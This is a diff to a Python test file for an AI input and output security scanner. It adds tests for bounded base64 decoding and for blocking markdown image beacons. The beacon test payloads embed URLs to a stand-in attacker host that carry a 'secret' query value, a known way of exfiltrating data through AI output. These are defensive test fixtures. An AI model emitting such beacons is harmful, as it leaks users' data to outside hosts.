@@ -2,7 +2,7 @@
 
 from __future__ import annotations
 
-from shadowshield import Direction
+from shadowshield import Direction, Severity, Shield
 from shadowshield.detectors import (
     AnomalyDetector,
     EncodingObfuscationDetector,
@@ -59,6 +59,22 @@ def test_encoding_detector_decodes_base64() -> None:
     assert any(t.metadata.get("technique") == "base64" for t in threats)
 
 
+def test_encoding_segment_flood_is_bounded_and_high_severity() -> None:
+    import base64
+
+    det = EncodingObfuscationDetector()
+    blobs = [base64.b64encode(f"hidden payload number {i:03}".encode()).decode() for i in range(40)]
+    text = " ".join(blobs)
+    context = _ctx(text)
+    threats = det.scan(text, context=context)
+
+    assert len(context.decoded_segments) == 24
+    assert context.metadata["decoded_segments_truncated"] is True
+    assert len(threats) <= 25
+    overflow = next(t for t in threats if t.metadata.get("technique") == "encoded_segment_limit")
+    assert overflow.severity is Severity.HIGH
+
+
 def test_exfiltration_detects_private_key_in_output() -> None:
     det = ExfiltrationDetector()
     text = "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----"
@@ -76,6 +92,18 @@ def test_exfiltration_instructions_input_only() -> None:
     out = det.scan(instr, context=_ctx(instr, Direction.OUTPUT))
     assert inp  # instruction flagged on input
     assert not out  # same words on output aren't an exfil *instruction*
+
+
+def test_markdown_beacon_bounds_do_not_create_detection_bypasses() -> None:
+    shield = Shield.for_mode("balanced")
+    cases = [f"![{'a' * length}](https://evil.example/p?d=secret)" for length in (256, 257)]
+    cases += [f"![x](https://evil.example/{'p' * length}?d=secret)" for length in (2_048, 2_049)]
+    cases += [f"![x](https://evil.example/p?{'k' * length}=secret)" for length in (512, 513)]
+
+    for payload in cases:
+        result = shield.scan_input(payload)
+        assert result.blocked
+        assert any(threat.detector == "data_exfiltration" for threat in result.threats)
 
 
 def test_anomaly_detector_flags_high_special_ratio() -> None:
